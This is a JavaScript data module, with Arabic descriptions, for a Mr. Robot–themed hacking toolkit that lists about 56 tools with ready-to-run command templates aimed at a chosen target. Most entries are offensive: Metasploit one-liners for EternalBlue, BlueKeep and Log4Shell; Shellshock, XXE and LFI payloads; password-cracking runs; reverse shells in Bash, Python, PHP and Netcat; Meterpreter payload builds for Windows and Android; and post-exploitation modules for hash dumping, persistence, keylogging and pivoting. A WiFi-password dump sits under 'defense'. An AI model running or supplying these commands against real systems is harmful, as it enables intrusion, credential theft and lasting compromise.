// ==================== قاعدة بيانات أدوات إليوت الكاملة (56+ أداة) ====================

export const TOOLS = [
  // ──────────────────────────────────── الفحص (Scanner) ────────────────────────────────────
  {
    id: 'nmap', name: 'Nmap', cat: 'scanner',
    desc: 'ماسح المنافذ والشبكات - أداة إليوت الأولى لرسم خريطة الهدف',
    cmd: 'nmap -sV -Pn -T4 {TARGET}', risk: 'medium', icon: '🔍'
  },
  {
    id: 'masscan', name: 'Masscan', cat: 'scanner',
    desc: 'أسرع ماسح منافذ في العالم - يفحص الإنترنت كله في 6 دقائق',
    cmd: 'masscan -p1-65535 --rate=1000 {TARGET}', risk: 'high', icon: '⚡'
  },
  {
    id: 'arp_sweep', name: 'ARP Sweep', cat: 'scanner',
    desc: 'اكتشاف الأجهزة على الشبكة المحلية - أداة إليوت الصامتة',
    cmd: 'arp-scan --localnet', risk: 'medium', icon: '📡'
  },
  {
    id: 'smb_scanner', name: 'SMB Scanner', cat: 'scanner',
    desc: 'كشف إصدار SMB - للبحث عن أهداف EternalBlue',
    cmd: 'nmap --script smb-os-discovery -p 445 {TARGET}', risk: 'high', icon: '📂'
  },
  {
    id: 'http_version', name: 'HTTP Version', cat: 'scanner',
    desc: 'كشف إصدار خادم HTTP',
    cmd: 'curl -sI {TARGET} | grep Server', risk: 'low', icon: '🌐'
  },
  {
    id: 'dirb', name: 'Dirb', cat: 'scanner',
    desc: 'ماسح المسارات المخفية على خوادم الويب',
    cmd: 'dirb {TARGET} /usr/share/wordlists/dirb/common.txt', risk: 'medium', icon: '📁'
  },
  {
    id: 'ssl_scanner', name: 'SSL Scanner', cat: 'scanner',
    desc: 'فحص قوة تشفير SSL/TLS',
    cmd: 'nmap --script ssl-enum-ciphers -p 443 {TARGET}', risk: 'medium', icon: '🔒'
  },
  {
    id: 'waf_detector', name: 'WAF Detector', cat: 'scanner',
    desc: 'كشف جدار الحماية للتطبيقات (WAF)',
    cmd: 'wafw00f {TARGET}', risk: 'low', icon: '🛡️'
  },
  {
    id: 'snmp_scanner', name: 'SNMP Scanner', cat: 'scanner',
    desc: 'فحص بروتوكول SNMP على الأجهزة',
    cmd: 'nmap -sU -p 161 {TARGET}', risk: 'medium', icon: '📊'
  },

  // ──────────────────────────────────── الاستغلال (Exploit) ────────────────────────────────────
  {
    id: 'eternal_blue', name: 'EternalBlue', cat: 'exploit',
    desc: 'ثغرة SMBv1 الشهيرة - استخدمها WannaCry و NotPetya (MS17-010)',
    cmd: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {TARGET}; run; exit"',
    risk: 'critical', icon: '💀'
  },
  {
    id: 'bluekeep', name: 'BlueKeep', cat: 'exploit',
    desc: 'ثغرة RDP القاتلة - تسمح بالدخول بدون كلمة مرور (CVE-2019-0708)',
    cmd: 'msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {TARGET}; run; exit"',
    risk: 'critical', icon: '🔓'
  },
  {
    id: 'log4shell', name: 'Log4Shell', cat: 'exploit',
    desc: 'ثغرة Log4j - أثرت على ملايين الخوادم (CVE-2021-44228)',
    cmd: 'msfconsole -q -x "use exploit/multi/http/log4shell_header_injection; set RHOSTS {TARGET}; run; exit"',
    risk: 'critical', icon: '☕'
  },
  {
    id: 'psexec', name: 'PsExec', cat: 'exploit',
    desc: 'تنفيذ أوامر عن بعد باستخدام SMB - يدعم Pass-the-Hash',
    cmd: 'msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS {TARGET}; run; exit"',
    risk: 'high', icon: '⚙️'
  },
  {
    id: 'shellshock', name: 'Shellshock', cat: 'exploit',
    desc: 'ثغرة Bash - تسمح بتنفيذ أوامر عن بعد (CVE-2014-6271)',
    cmd: 'curl -H "User-Agent: () { :; }; /bin/bash -c \'id\'" {TARGET}',
    risk: 'high', icon: '🐚'
  },
  {
    id: 'sqli_tester', name: 'SQLi Tester', cat: 'exploit',
    desc: 'فاحص SQL Injection - حمولات جاهزة للاختبار',
    cmd: 'sqlmap -u {TARGET} --batch --level=3 --risk=2', risk: 'high', icon: '💉'
  },
  {
    id: 'xss_tester', name: 'XSS Tester', cat: 'exploit',
    desc: 'فاحص XSS - يختبر GET و POST و Headers',
    cmd: 'curl -s {TARGET} | grep -i "script"', risk: 'high', icon: '⚠️'
  },
  {
    id: 'xxe_tester', name: 'XXE Tester', cat: 'exploit',
    desc: 'فاحص XXE Injection - حمولات XML خارجية',
    cmd: 'curl -X POST {TARGET} -d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>\'',
    risk: 'high', icon: '📄'
  },
  {
    id: 'lfi_tester', name: 'LFI Tester', cat: 'exploit',
    desc: 'فاحص تضمين الملفات المحلية (LFI)',
    cmd: 'curl -s "{TARGET}/../../../../../etc/passwd"', risk: 'high', icon: '📂'
  },
  {
    id: 'jwt_toolkit', name: 'JWT Toolkit', cat: 'exploit',
    desc: 'فك وتزوير رموز JWT',
    cmd: 'python3 -c "import jwt; print(jwt.decode(\'{TARGET}\', options={\"verify_signature\": False}))"',
    risk: 'high', icon: '🎫'
  },
  {
    id: 'nosql_tester', name: 'NoSQL Tester', cat: 'exploit',
    desc: 'فاحص NoSQL Injection (MongoDB)',
    cmd: 'curl -X POST {TARGET} -H "Content-Type: application/json" -d \'{"$ne": ""}\'',
    risk: 'high', icon: '🗄️'
  },

  // ──────────────────────────────────── OSINT ────────────────────────────────────
  {
    id: 'theharvester', name: 'theHarvester', cat: 'osint',
    desc: 'جمع الإيميلات والنطاقات الفرعية - أداة إليوت للاستطلاع',
    cmd: 'theHarvester -d {TARGET} -b google,linkedin', risk: 'low', icon: '🌐'
  },
  {
    id: 'whois', name: 'WHOIS', cat: 'osint',
    desc: 'معلومات تسجيل النطاق - تاريخ الإنشاء، المالك، DNS',
    cmd: 'whois {TARGET}', risk: 'low', icon: '📋'
  },
  {
    id: 'sherlock', name: 'Sherlock', cat: 'osint',
    desc: 'صائد الأسماء - البحث عن اسم مستخدم عبر 300+ منصة',
    cmd: 'sherlock {TARGET}', risk: 'low', icon: '🕵️'
  },
  {
    id: 'holehe', name: 'Holehe', cat: 'osint',
    desc: 'فحص بريد إلكتروني - معرفة الخدمات المسجل بها',
    cmd: 'holehe {TARGET}', risk: 'low', icon: '📧'
  },
  {
    id: 'subfinder', name: 'Subfinder', cat: 'osint',
    desc: 'اكتشاف النطاقات الفرعية',
    cmd: 'subfinder -d {TARGET}', risk: 'low', icon: '🔎'
  },
  {
    id: 'dig', name: 'DIG', cat: 'osint',
    desc: 'استعلامات DNS - A, MX, NS, TXT',
    cmd: 'dig {TARGET} ANY', risk: 'low', icon: '📡'
  },
  {
    id: 'geo_ip', name: 'Geo IP', cat: 'osint',
    desc: 'تحديد الموقع الجغرافي من عنوان IP',
    cmd: 'curl -s "http://ip-api.com/json/{TARGET}"', risk: 'low', icon: '📍'
  },
  {
    id: 'metadata_extractor', name: 'Metadata Extractor', cat: 'osint',
    desc: 'استخراج البيانات الوصفية من الملفات (EXIF)',
    cmd: 'exiftool {TARGET}', risk: 'low', icon: '📸'
  },

  // ──────────────────────────────────── كسر كلمات المرور (Crack) ────────────────────────────────────
  {
    id: 'hydra', name: 'Hydra', cat: 'crack',
    desc: 'أداة تخمين كلمات المرور - تدعم 50+ بروتوكول',
    cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt {TARGET} ssh',
    risk: 'high', icon: '🔑'
  },
  {
    id: 'john', name: 'John the Ripper', cat: 'crack',
    desc: 'كاسر كلمات المرور من التجزئات - يدعم 100+ صيغة',
    cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt {TARGET}',
    risk: 'high', icon: '🔨'
  },
  {
    id: 'hashcat', name: 'Hashcat', cat: 'crack',
    desc: 'أسرع كاسر كلمات مرور - يستخدم GPU',
    cmd: 'hashcat -m 0 {TARGET} /usr/share/wordlists/rockyou.txt',
    risk: 'high', icon: '⚡'
  },
  {
    id: 'cewl', name: 'CeWL', cat: 'crack',
    desc: 'توليد قوائم كلمات من موقع ويب',
    cmd: 'cewl {TARGET} -w custom_wordlist.txt', risk: 'low', icon: '📝'
  },
  {
    id: 'crunch', name: 'Crunch', cat: 'crack',
    desc: 'توليد قوائم كلمات مخصصة',
    cmd: 'crunch 4 6 abc123 -o wordlist.txt', risk: 'low', icon: '🔢'
  },
  {
    id: 'rsmangler', name: 'RSMangler', cat: 'crack',
    desc: 'تعديل وتوليد قوائم كلمات من كلمة أساسية',
    cmd: 'rsmangler --wordlist {TARGET} --output mangled.txt',
    risk: 'low', icon: '🔄'
  },

  // ──────────────────────────────────── الحمولات (Payload) ────────────────────────────────────
  {
    id: 'rev_shell_bash', name: 'Reverse Shell (Bash)', cat: 'payload',
    desc: 'صدفة عكسية بلغة Bash',
    cmd: 'bash -i >& /dev/tcp/{TARGET}/4444 0>&1', risk: 'critical', icon: '🐚'
  },
  {
    id: 'rev_shell_python', name: 'Reverse Shell (Python)', cat: 'payload',
    desc: 'صدفة عكسية بلغة Python',
    cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{TARGET}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    risk: 'critical', icon: '🐍'
  },
  {
    id: 'rev_shell_php', name: 'Reverse Shell (PHP)', cat: 'payload',
    desc: 'صدفة عكسية بلغة PHP',
    cmd: 'php -r \'$sock=fsockopen("{TARGET}",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
    risk: 'critical', icon: '🐘'
  },
  {
    id: 'rev_shell_netcat', name: 'Reverse Shell (Netcat)', cat: 'payload',
    desc: 'صدفة عكسية باستخدام Netcat',
    cmd: 'nc -e /bin/sh {TARGET} 4444', risk: 'critical', icon: '🔗'
  },
  {
    id: 'meterpreter_win', name: 'Meterpreter (Windows)', cat: 'payload',
    desc: 'توليد حمولة Meterpreter لويندوز',
    cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={TARGET} LPORT=4444 -f exe -o shell.exe',
    risk: 'critical', icon: '🪟'
  },
  {
    id: 'meterpreter_android', name: 'Meterpreter (Android)', cat: 'payload',
    desc: 'توليد حمولة Meterpreter لأندرويد',
    cmd: 'msfvenom -p android/meterpreter/reverse_tcp LHOST={TARGET} LPORT=4444 R -o app.apk',
    risk: 'critical', icon: '📱'
  },
  {
    id: 'web_delivery', name: 'Web Delivery', cat: 'payload',
    desc: 'توصيل حمولة عبر الويب (Python/PowerShell)',
    cmd: 'msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST {TARGET}; run; exit"',
    risk: 'critical', icon: '🌐'
  },

  // ──────────────────────────────────── ما بعد الاختراق (Post) ────────────────────────────────────
  {
    id: 'hashdump', name: 'Hashdump', cat: 'post',
    desc: 'استخراج تجزئات كلمات المرور من SAM',
    cmd: 'msfconsole -q -x "use post/windows/gather/hashdump; set SESSION 1; run; exit"',
    risk: 'critical', icon: '🗄️'
  },
  {
    id: 'getsystem', name: 'GetSystem', cat: 'post',
    desc: 'رفع الصلاحيات إلى SYSTEM - أعلى صلاحية في ويندوز',
    cmd: 'msfconsole -q -x "use post/multi/recon/local_exploit_suggester; set SESSION 1; run; exit"',
    risk: 'critical', icon: '⬆️'
  },
  {
    id: 'persistence', name: 'Persistence', cat: 'post',
    desc: 'تثبيت باب خلفي للعودة الدائمة',
    cmd: 'msfconsole -q -x "use post/windows/manage/persistence; set SESSION 1; run; exit"',
    risk: 'critical', icon: '🚪'
  },
  {
    id: 'keylogger', name: 'Keylogger', cat: 'post',
    desc: 'تسجيل ضغطات المفاتيح على جهاز الضحية',
    cmd: 'msfconsole -q -x "use post/windows/capture/keylog_recorder; set SESSION 1; run; exit"',
    risk: 'critical', icon: '⌨️'
  },
  {
    id: 'migrate', name: 'Process Migration', cat: 'post',
    desc: 'نقل الجلسة إلى عملية نظام للتمويه',
    cmd: 'msfconsole -q -x "use post/windows/manage/migrate; set SESSION 1; run; exit"',
    risk: 'high', icon: '🔄'
  },
  {
    id: 'pivoting', name: 'Pivoting', cat: 'post',
    desc: 'استخدام الجهاز المخترق للوصول لشبكات أخرى',
    cmd: 'msfconsole -q -x "use post/multi/manage/autoroute; set SESSION 1; run; exit"',
    risk: 'critical', icon: '🔀'
  },

  // ──────────────────────────────────── الدفاع (Defense) ────────────────────────────────────
  {
    id: 'security_headers', name: 'Security Headers', cat: 'defense',
    desc: 'فحص رؤوس الأمان HTTP - HSTS, CSP, X-Frame',
    cmd: 'curl -sI {TARGET} | grep -iE "strict-transport|content-security|x-frame|x-content"',
    risk: 'low', icon: '🛡️'
  },
  {
    id: 'cookie_analyzer', name: 'Cookie Analyzer', cat: 'defense',
    desc: 'تحليل الكوكيز وسمات الأمان',
    cmd: 'curl -sI {TARGET} | grep -i "set-cookie"', risk: 'low', icon: '🍪'
  },
  {
    id: 'cors_checker', name: 'CORS Checker', cat: 'defense',
    desc: 'فحص إعدادات CORS - كشف الثغرات الخطيرة',
    cmd: 'curl -sI -H "Origin: https://evil.com" {TARGET}', risk: 'medium', icon: '🌍'
  },
  {
    id: 'clickjacking', name: 'Clickjacking Detector', cat: 'defense',
    desc: 'فحص الحماية ضد النقر المخادع',
    cmd: 'curl -sI {TARGET} | grep -i "x-frame-options"', risk: 'medium', icon: '🖱️'
  },
  {
    id: 'arp_watchdog', name: 'ARP Watchdog', cat: 'defense',
    desc: 'حارس الشبكة - كشف هجمات ARP Spoofing',
    cmd: 'arp-scan --localnet | grep -v DUP', risk: 'medium', icon: '📡'
  },
  {
    id: 'wifi_scanner', name: 'WiFi Scanner', cat: 'defense',
    desc: 'ماسح الشبكات اللاسلكية - كشف الشبكات القريبة',
    cmd: 'termux-wifi-scaninfo', risk: 'low', icon: '📶'
  },
  {
    id: 'wifi_password', name: 'WiFi Password', cat: 'defense',
    desc: 'استخراج كلمات مرور الواي فاي المحفوظة',
    cmd: 'su -c "cat /data/misc/wifi/wpa_supplicant.conf" 2>/dev/null || cat /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null',
    risk: 'high', icon: '🔐'
  },

  // ──────────────────────────────────── المنصات المتكاملة (Framework) ────────────────────────────────────
  {
    id: 'metasploit', name: 'Metasploit', cat: 'framework',
    desc: 'إطار عمل إليوت الأساسي - يحتوي على آلاف الثغرات',
    cmd: 'msfconsole -q', risk: 'critical', icon: '💀'
  },
  {
    id: 'beef', name: 'BeEF', cat: 'framework',
    desc: 'إطار استغلال المتصفحات - يخترق الضحايا عبر متصفحاتهم',
    cmd: 'beef-xss', risk: 'high', icon: '🐄'
  },
  {
    id: 'set', name: 'Social Engineering Toolkit', cat: 'framework',
    desc: 'أداة الهندسة الاجتماعية - التصيد، USB، المواقع المزيفة',
    cmd: 'setoolkit', risk: 'high', icon: '🎣'
  },
  {
    id: 'empire', name: 'Empire (PowerShell)', cat: 'framework',
    desc: 'إطار عمل PowerShell للتحكم في أنظمة ويندوز عن بعد',
    cmd: 'empire', risk: 'critical', icon: '👑'
  },
  {
    id: 'cobalt_strike', name: 'Cobalt Strike', cat: 'framework',
    desc: 'منصة محاكاة الفريق الأحمر - الأقوى في العالم',
    cmd: '# Cobalt Strike - Team Server', risk: 'critical', icon: '🎯'
  },
  {
    id: 'toolx', name: 'Tool-X', cat: 'framework',
    desc: 'منصة أدوات اختبار الاختراق المتكاملة - 70+ أداة',
    cmd: 'toolx', risk: 'high', icon: '🛠️'
  },
];

// ==================== الفئات ====================
export const CATEGORIES = {
  scanner: { label: 'الفحص', icon: '🔍', color: '#00ff88' },
  exploit: { label: 'الاستغلال', icon: '⚔️', color: '#ff3b3b' },
  osint: { label: 'OSINT', icon: '🌐', color: '#00aaff' },
  crack: { label: 'كسر كلمات المرور', icon: '🔓', color: '#ffaa00' },
  payload: { label: 'الحمولات', icon: '📦', color: '#ff6600' },
  post: { label: 'ما بعد الاختراق', icon: '📌', color: '#aa00ff' },
  defense: { label: 'الدفاع', icon: '🛡️', color: '#00ccaa' },
  framework: { label: 'المنصات', icon: '🛠️', color: '#ff9500' },
};

// ==================== دوال المساعدة ====================
export function getToolsByCategory(cat) {
  if (!cat || cat === 'all') return TOOLS;
  return TOOLS.filter(t => t.cat === cat);
}

export function getToolById(id) {
  return TOOLS.find(t => t.id === id);
}

export function getSuggestedTools(target) {
  if (!target) return [];
  const t = target.toLowerCase();
  if (t.includes('@')) return TOOLS.filter(tool => tool.cat === 'osint');
  if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(t.trim())) return TOOLS.filter(tool => ['scanner', 'exploit', 'crack', 'defense'].includes(tool.cat));
  if (/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t.trim())) return TOOLS.filter(tool => ['scanner', 'osint', 'defense', 'exploit'].includes(tool.cat));
  return TOOLS.slice(0, 12);
}
